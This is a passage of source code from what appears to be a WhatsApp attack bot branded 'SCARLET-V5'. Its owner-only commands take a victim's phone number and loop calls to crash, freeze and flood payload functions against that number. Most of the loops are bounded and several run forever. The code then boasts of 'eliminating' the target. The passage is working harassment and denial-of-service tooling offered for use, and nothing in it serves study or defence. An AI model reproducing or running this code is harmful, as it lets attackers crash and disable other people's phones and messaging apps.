𝐓𝐀𝐑𝐆𝐄𝐓 𝙀𝙇𝙄𝙈𝙄𝙉𝘼𝙏𝙀𝘿 𝘽𝙔 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5
👑 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
👑 𝐔𝐒𝐈𝐍𝐆 : ${command}
   `)
await sleep(2000)
await bad.sendMessage(m.chat, {
audio: darkphonk,
mimetype: 'audio/mpeg'
}, { quoted: extd
})
}
break
case 'xiphone': {

               
if (!isOwner) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Example\n ${prefix + command} 234###`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 10; i++) {
await XiosPay(target)
await XiosVirus(target)
await TxIos(target, Ptcp = true)
await sleep(1)
await XiosPay(target)
await XiosVirus(target)
await TxIos(target, Ptcp = true)
await sleep(1)
await XiosPay(target)
await XiosVirus(target)
await TxIos(target, Ptcp = true)
await sleep(1)
}
bad.sendMessage(m.chat, {react: {text: '🤴', key: m.key}})
}
break
case "iphone": {

               
if (!isOwner) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Example\n ${prefix + command} 234###`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 10; i++) {
await XiosPay(target)
await XiosVirus(target)
await TxIos(target, Ptcp = true)
await sleep(1)
await XiosPay(target)
await XiosVirus(target)
await TxIos(target, Ptcp = true)
await sleep(1)
await XiosPay(target)
await XiosVirus(target)
await TxIos(target, Ptcp = true)
await sleep(1)
}
bad.sendMessage(m.chat, {react: {text: '🦄', key: m.key}})
}
break
case 'scarlet': {

               
if (!isOwner) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Example: ${prefix + command} 234###`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 70; i++) {
await freezekamoflase(target, true)
await nulltag(target, true)
await nulltag(target, true)
await NewsletterZap(target, true)
await freezegc(target, true)
await freezeuii(target, true)
await freezekamoflase(target, true)
await nulltag(target, true)
await nulltag(target, true)
await NewsletterZap(target, true)
await freezegc(target, true)
await freezeuii(target, true)
await freezekamoflase(target, true)
await newfreezebug(target, true)
await nulltag(target, true)
await NewsletterZap(target, true)
await freezeui(target, true)
await freezeuii(target, true)

}
reply(`
𝐓𝐀𝐑𝐆𝐄𝐓 𝙀𝙇𝙄𝙈𝙄𝙉𝘼𝙏𝙀𝘿 𝘽𝙔 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5
👑 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
👑 𝐔𝐒𝐈𝐍𝐆 : ${command}
   `)
await sleep(2000)
await bad.sendMessage(m.chat, {
audio: darkphonk,
mimetype: 'audio/mpeg'
}, { quoted: extd
})
}
break
    case 'one-tap': {
    
if (!isOwner) return

reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let j = 0; j < 30; j++) {
await nulltag(m.chat, bad, ptcp = true)
await freezekamoflase(m.chat, bad, ptcp = true)
await freezeui(m.chat, bad, ptcp = true)
await freezeuii(m.chat, bad, ptcp = true)
await newvirpen(m.chat, bad, ptcp =true)
await nulltag(m.chat, bad, ptcp = true)
await freezekamoflase(m.chat, bad, ptcp = true)
await freezeui(m.chat, bad, ptcp = true)
await freezeuii(m.chat, bad, ptcp = true)
await newvirpen(m.chat, bad, ptcp =true)
await nulltag(m.chat, bad, ptcp = true)
await freezekamoflase(m.chat, bad, ptcp = true)
await freezeui(m.chat, bad, ptcp = true)
await freezeuii(m.chat, bad, ptcp = true)
await newvirpen(m.chat, bad, ptcp =true)
}
}
break

case 'darkness': {

               
if (!isOwner) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Example: ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break
case 'witch': {

               
if (!isOwner) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Example: ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target, Null)
await InVisiXz(target, Null)
await InVisiLoc(target, Null)
await Combox1(from, jumlah) 
await Combox2(from, jumlah)
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target, Null)
await InVisiXz(target, Null)
await InVisiLoc(target, Null)
await Combox1(from, jumlah) 
await Combox2(from, jumlah) 
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target, Null)
await InVisiXz(target, Null)
await InVisiLoc(target, Null)
await Combox1(from, jumlah) 
await Combox2(from, jumlah) 
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break
 case 'iosbug': {
 

if (!isOwner) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Penggunaan ${prefix + command} 234xx××`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return reply(`> comand salah gunakan Example di bawah\n.example 234xxx`)
let target = pepec + '@s.whatsapp.net'
let DoneBug = `𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 `
await bad.sendMessage(from, { video: { url: `https://img100.pixhost.to/images/759/541275724_skyzopedia.jpg` },
caption: DoneBug,
gifPlayback: true,
}, { quoted: m });
for (let i = 0; ; i++) {
await FrezeiOS(target)
await FrezeiOS(target)
await FrezeiOS(target)
await FrezeiOS(target)
await FrezeiOS(target)
}
}
break
 case 'iosdelay': {
 

if (!isOwner) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Penggunaan ${prefix + command} 234xx××`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return reply(`> comand salah gunakan Example di bawah\n.example 234xxx`)
let target = pepec + '@s.whatsapp.net'
let DoneBug = `𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 `
await bad.sendMessage(from, { video: { url: `https://img100.pixhost.to/images/759/541275724_skyzopedia.jpg` },
caption: DoneBug,
gifPlayback: true,
}, { quoted: m });
for (let i = 700; ; i++) {
await FrezeiOS(m.chat)
await FrezeiOS(m.chat)
await FrezeiOS(m.chat)
await FrezeiOS(m.chat)
await FrezeiOS(m.chat)
}
}
break
 case 'combo': {
 

if (!isOwner) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Penggunaan ${prefix + command} 234xx××`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return reply(`> comand salah gunakan Example di bawah\n.example 234xxx`)
let target = pepec + '@s.whatsapp.net'
let DoneBug = `𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 `
await bad.sendMessage(from, { video: { url: `https://img100.pixhost.to/images/759/541275724_skyzopedia.jpg` },
caption: DoneBug,
gifPlayback: true,
}, { quoted: m });
for (let i = 600; ; i++) {
await ComBox(target)
await ComBox(m.chat)
await ComBox(target)
await ComBox(m.chat)
await ComBox(target)
await ComBox(m.chat)
}
}
break

case 'beta': {


if (!isOwner) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Penggunaan ${prefix + command} 234x××`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return reply(`> comand salah gunakan Example di bawah\n.example 234xxx`)
let target = pepec + '@s.whatsapp.net'
let DoneBug = `𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜ホ‼️ `
await bad.sendMessage(from, { video: { url: `https://img100.pixhost.to/images/759/541275724_skyzopedia.jpg` },
caption: DoneBug,
gifPlayback: true,
}, { quoted: m });
for (let i = 800; ; i++) {
await ComBox(target)
await FloodsCarousel(target, Ptcp = true)
await ComBox(target)
await FloodsCarousel(target, Ptcp = true)
await ComBox(target)
await FloodsCarousel(target, Ptcp = true)
await ComBox(target)
await FloodsCarousel(target, Ptcp = true)
await ComBox(target)
await FloodsCarousel(target, Ptcp = true)
await ComBox(target)
await FloodsCarousel(target, Ptcp = true)
await ComBox(target)
await FloodsCarousel(target, Ptcp = true)
await ComBox(target)
await FloodsCarousel(target, Ptcp = true)
}
}
break


case 'abyys': {


if (!isOwner) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Example: ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 30; i++) {
await Combox(target)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox(target)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break

case 'tap': {

if (!isOwner) return reply(`𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦`)
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
jumlah = 50
await Combox(from, jumlah)
await CrashUi(target)
await Combox3(from, jumlah)
await InVisiXz(target)
await InVisiLoc(target)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
break

case 'antis':

        if (!isOwner) return reply(`𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦`)
        if (!q) {
          return reply(`\`Example:\` : ${prefix+command} 234xxx`);
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        reply(`_</> Attack Sucsess_\n</> Attack Name : ${prefix+command} `);
        for (let i = 0; ; i++) {
          await whatsappoffcbjir(target);
          await uilokas(target);
          await killui(target);
          await whatsappoffcbjirrrr(target);
          await badk(target);
        }
        break;



      case 'kill':
      
        if (!isOwner) return reply(`𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦`)
        if (!q) {
          return reply(`\`Example:\` : ${prefix+command} 234xxx`);
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        reply(`_</> Attack Sucsess_\n</> Attack Name : ${prefix+command} `);
        for (let i = 0; ; i++) {
          await whatsappoffcbjir(target);
          await uilokas(target);
          await deadline(target);
          await badk(target);
        }
        await sleep(1000);
        break;
        
      case 'meta':
      
        if (!isOwner) return reply(`𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦`)
        if (!q) {
          return reply(`\`Example:\` : ${prefix+command} 234xxx`);
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        reply(`_</> Attack Sucsess_\n</> Attack Name : ${prefix+command} `);
        for (let i = 0; ; i++) {
          await deadline(target);
          await whatsappoffcbjir(target);
          await uilokas(target);
          await deadline(target);
          await whatsappoffcbjir(target);
          await uilokas(target);
          await deadline(target);
        }
        await sleep(1000);
        break;
        case 'jojo': case 'star':
        
        if (!isOwner) return reply(`𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦`)
        if (!q) {
          return reply(`\`Example:\` : ${prefix+command} 234xxx`);
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        reply(`_</> Attack Sucsess_\n</> Attack Name : ${prefix+command}`);
        for (let i = 0; ; i++) {
          await deadline(target);
          await uilokas(target);
          await deadline(target);
          await whatsappoffcbjir(target);
          await uilokas(target);
          await deadline(target);
        }
        await sleep(1000);
break

case 'fire': {

if (!isOwner) return reply(`𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦`)
